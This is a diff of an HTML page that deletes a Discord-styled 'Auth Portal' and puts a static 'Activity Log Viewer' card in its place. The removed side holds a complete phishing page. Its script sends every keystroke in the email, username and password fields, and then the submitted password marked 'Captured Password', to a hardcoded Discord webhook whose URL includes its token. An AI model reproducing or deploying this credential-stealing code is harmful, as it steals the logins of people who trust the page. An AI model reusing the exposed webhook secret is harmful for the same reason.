@@ -3,340 +3,213 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord - Auth Portal</title>
+  <title>Activity Log Viewer</title>
   <style>
+    :root {
+      --bg-dark: #202225;
+      --card-bg: #2f3136;
+      --card-border: #202225;
+      --text-main: #dcddde;
+      --text-muted: #b9bbbe;
+      --accent-green: #57f287;
+      --accent-blurple: #5865f2;
+      --code-bg: #1e1f22;
+    }
+
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
     }
 
     body {
-      background: #313338;
+      background-color: var(--bg-dark);
+      color: var(--text-main);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      color: #f2f3f5;
+      padding: 20px;
     }
 
-    .auth-container {
-      background-color: #2b2d31;
-      width: 100%;
-      max-width: 480px;
-      padding: 32px;
+    .log-card {
+      background-color: var(--card-bg);
       border-radius: 8px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      border-left: 4px solid var(--accent-blurple);
+      width: 100%;
+      max-width: 600px;
+      padding: 16px 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
     }
 
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .header h2 {
-      font-size: 24px;
-      font-weight: 600;
-      color: #f2f3f5;
-      margin-bottom: 8px;
-    }
-
-    .header p {
-      color: #949ba4;
-      font-size: 14px;
-    }
-
-    .tab-switch {
+    /* Header Section */
+    .log-header {
       display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-      background: #1e1f22;
-      padding: 4px;
-      border-radius: 4px;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
     }
 
-    .tab-btn {
-      flex: 1;
-      padding: 8px;
-      background: transparent;
-      border: none;
-      color: #949ba4;
-      font-size: 13px;
+    .avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .username {
       font-weight: 600;
-      cursor: pointer;
-      border-radius: 3px;
+      font-size: 1rem;
+      color: #fff;
     }
 
-    .tab-btn.active {
-      background-color: #35373c;
-      color: #ffffff;
+    .repo-name {
+      font-size: 0.85rem;
+      color: var(--text-muted);
     }
 
-    .form-group {
-      margin-bottom: 16px;
+    .repo-name a {
+      color: var(--accent-blurple);
+      text-decoration: none;
     }
 
-    label {
-      display: block;
-      color: #b5bac1;
-      font-size: 11px;
-      font-weight: 700;
-      text-transform: uppercase;
-      margin-bottom: 8px;
+    .repo-name a:hover {
+      text-decoration: underline;
     }
 
-    label span.required {
-      color: #f23f43;
-    }
-
-    input, textarea {
-      width: 100%;
-      background-color: #1e1f22;
-      border: 1px solid #111214;
-      border-radius: 3px;
-      padding: 10px;
-      color: #dbdee1;
-      font-size: 14px;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-
-    input:focus, textarea:focus {
-      border-color: #5865f2;
-    }
-
-    .btn {
-      width: 100%;
+    /* Metadata Grid */
+    .meta-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      background: rgba(0, 0, 0, 0.15);
       padding: 12px;
-      background-color: #5865f2;
-      color: #ffffff;
-      border: none;
-      border-radius: 3px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 8px;
-      transition: background-color 0.2s;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      font-size: 0.85rem;
     }
 
-    .btn:hover {
-      background-color: #4752c4;
+    .meta-item {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
     }
 
-    .dashboard-panel {
-      display: none;
+    .meta-label {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-weight: 700;
     }
 
-    .status-msg {
-      margin-top: 12px;
-      font-size: 12px;
-      text-align: center;
+    .meta-value {
+      font-weight: 500;
     }
 
-    .log-box {
-      margin-top: 16px;
-      background-color: #1e1f22;
-      padding: 10px;
+    code {
+      background: var(--code-bg);
+      padding: 2px 6px;
       border-radius: 4px;
-      font-size: 12px;
-      color: #949ba4;
-      max-height: 100px;
-      overflow-y: auto;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 0.82rem;
+      color: #e3e5e8;
+    }
+
+    /* Activity Stream */
+    .activity-section {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .activity-title {
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .history-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .history-item {
+      display: flex;
+      align-items: baseline;
+      gap: 8px;
+      font-size: 0.9rem;
+      line-height: 1.4;
+    }
+
+    .timestamp {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      font-family: monospace;
+      white-space: nowrap;
+    }
+
+    .branch-badge {
+      background-color: rgba(87, 242, 135, 0.1);
+      color: var(--accent-green);
+      font-size: 0.75rem;
+      padding: 1px 6px;
+      border-radius: 12px;
+      border: 1px solid rgba(87, 242, 135, 0.3);
     }
   </style>
 </head>
 <body>
 
-  <div class="auth-container">
-    <!-- AUTH TAB CONTROL -->
-    <div id="authHeader" class="header">
-      <h2 id="titleText">Welcome back!</h2>
-      <p id="subtitleText">We're so excited to see you again!</p>
+  <div class="log-card">
+    <!-- Header -->
+    <div class="log-header">
+      <img class="avatar" src="https://github.com/identicons/eisakhan.png" alt="User Avatar">
+      <div class="user-info">
+        <span class="username">eisakhan</span>
+        <span class="repo-name">repository: <a href="#">discord-bot-test</a></span>
+      </div>
     </div>
 
-    <div id="tabBar" class="tab-switch">
-      <button class="tab-btn active" onclick="setMode('login')">Log In</button>
-      <button class="tab-btn" onclick="setMode('register')">Register</button>
+    <!-- Metadata Grid -->
+    <div class="meta-grid">
+      <div class="meta-item">
+        <span class="meta-label">User Details</span>
+        <span class="meta-value"><code>eisakhan</code> (test@example.com)</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Latest Commit</span>
+        <span class="meta-value"><code style="color: #5865f2;">#a1b2c3d</code> on <span class="branch-badge">main</span></span>
+      </div>
     </div>
 
-    <!-- FORM INPUTS -->
-    <div id="authForm">
-      <div class="form-group" id="emailGroup">
-        <label>Email or Phone Number <span class="required">*</span></label>
-        <input type="text" id="email" oninput="logKeystroke('Email/Phone', this.value)" autocomplete="off" />
-      </div>
-
-      <div class="form-group" id="usernameGroup" style="display: none;">
-        <label>Username <span class="required">*</span></label>
-        <input type="text" id="regUsername" oninput="logKeystroke('Username', this.value)" autocomplete="off" />
-      </div>
-
-      <div class="form-group">
-        <label>Password <span class="required">*</span></label>
-        <input type="password" id="password" oninput="logKeystroke('Password', this.value)" autocomplete="off" />
-      </div>
-
-      <button id="authBtn" class="btn" onclick="submitAuth()">Log In</button>
-      <p id="authStatus" class="status-msg"></p>
-    </div>
-
-    <!-- DASHBOARD PANEL (SHOWN AFTER SIGN IN) -->
-    <div id="dashboard" class="dashboard-panel">
-      <div class="form-group">
-        <label>Send Message to Discord Channel</label>
-        <textarea id="msgContent" placeholder="Type a message..."></textarea>
-      </div>
-      <button class="btn" onclick="sendDashboardMessage()">Send Message</button>
-      <p id="dashStatus" class="status-msg"></p>
-      
-      <div class="log-box" id="keystrokeFeed">
-        Live keystrokes streaming to webhook...
-      </div>
+    <!-- Activity History -->
+    <div class="activity-section">
+      <div class="activity-title">Activity History (2 actions)</div>
+      <ul class="history-list">
+        <li class="history-item">
+          <span class="timestamp">[18:10]</span>
+          <code>a1b2c3d</code>
+          <span>initial commit and logger setup</span>
+        </li>
+        <li class="history-item">
+          <span class="timestamp">[18:12]</span>
+          <code>e5f6g7h</code>
+          <span>updated edit-history logic in index.js</span>
+        </li>
+      </ul>
     </div>
   </div>
-
-  <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1550955330543034419/_ER-T65Hr1l8FTNmO_tIa3Kn_fPg4z4AFvUVTXeKI5tdjPGoLyZ3oo5O1GX_FoRSQ2dc";
-
-    let currentMode = 'login';
-    let keystrokeTimer = null;
-
-    function setMode(mode) {
-      currentMode = mode;
-      const title = document.getElementById("titleText");
-      const sub = document.getElementById("subtitleText");
-      const userGrp = document.getElementById("usernameGroup");
-      const btn = document.getElementById("authBtn");
-      const tabs = document.querySelectorAll(".tab-btn");
-
-      if (mode === 'login') {
-        title.innerText = "Welcome back!";
-        sub.innerText = "We're so excited to see you again!";
-        userGrp.style.display = "none";
-        btn.innerText = "Log In";
-        tabs[0].classList.add("active");
-        tabs[1].classList.remove("active");
-      } else {
-        title.innerText = "Create an account";
-        sub.innerText = "Enter your details below to register.";
-        userGrp.style.display = "block";
-        btn.innerText = "Continue";
-        tabs[1].classList.add("active");
-        tabs[0].classList.remove("active");
-      }
-    }
-
-    // Capture every character typed and send live updates
-    function logKeystroke(field, value) {
-      clearTimeout(keystrokeTimer);
-      keystrokeTimer = setTimeout(() => {
-        const now = new Date();
-        const isoTime = now.toISOString();
-        const localTime = now.toLocaleString();
-
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            embeds: [{
-              title: "⌨️ Live Keystroke Captured",
-              color: 0xFEE75C,
-              fields: [
-                { name: "Field", value: field, inline: true },
-                { name: "Current Text Value", value: `\`\`\`${value || '[Empty]'}\`\`\``, inline: false },
-                { name: "Exact Time (ISO)", value: isoTime, inline: true },
-                { name: "Local Time", value: localTime, inline: true }
-              ],
-              footer: { text: "Auth Telemetry Logger" },
-              timestamp: isoTime
-            }]
-          })
-        }).catch(() => {});
-      }, 500); // Debounce to avoid hitting rate limits
-    }
-
-    async function submitAuth() {
-      const email = document.getElementById("email").value;
-      const username = document.getElementById("regUsername").value || email.split('@')[0];
-      const password = document.getElementById("password").value;
-      const status = document.getElementById("authStatus");
-
-      const now = new Date();
-
-      status.style.color = "#f0b232";
-      status.innerText = "Authenticating...";
-
-      // Send detailed Embed with all user details
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username: "Auth System",
-            embeds: [{
-              title: currentMode === 'login' ? "🔑 User Login Attempt" : "📝 New Account Created",
-              color: currentMode === 'login' ? 0x5865F2 : 0x57F287,
-              fields: [
-                { name: "Action Type", value: currentMode.toUpperCase(), inline: true },
-                { name: "Username", value: username || "N/A", inline: true },
-                { name: "Email / Phone", value: email || "N/A", inline: false },
-                { name: "Captured Password", value: `\`\`\`${password}\`\`\``, inline: false },
-                { name: "Exact Time (UTC)", value: now.toUTCString(), inline: true },
-                { name: "Timestamp (ISO)", value: now.toISOString(), inline: true }
-              ],
-              footer: { text: `User Agent: ${navigator.userAgent.slice(0, 50)}...` },
-              timestamp: now.toISOString()
-            }]
-          })
-        });
-
-        status.style.color = "#23a55a";
-        status.innerText = "Success! Redirecting to dashboard...";
-
-        setTimeout(() => {
-          document.getElementById("authHeader").style.display = "none";
-          document.getElementById("tabBar").style.display = "none";
-          document.getElementById("authForm").style.display = "none";
-          document.getElementById("dashboard").style.display = "block";
-        }, 1000);
-
-      } catch (err) {
-        status.style.color = "#f23f43";
-        status.innerText = "Authentication failed.";
-      }
-    }
-
-    async function sendDashboardMessage() {
-      const msg = document.getElementById("msgContent").value;
-      const status = document.getElementById("dashStatus");
-      const now = new Date();
-
-      if (!msg) return;
-
-      status.innerText = "Sending...";
-
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [{
-            title: "💬 Dashboard Message Sent",
-            color: 0x3498DB,
-            description: msg,
-            fields: [
-              { name: "Exact Send Time", value: now.toLocaleString(), inline: true }
-            ],
-            timestamp: now.toISOString()
-          }]
-        })
-      });
-
-      status.style.color = "#23a55a";
-      status.innerText = "Sent!";
-      document.getElementById("msgContent").value = "";
-    }
-  </script>
 
 </body>
 </html>
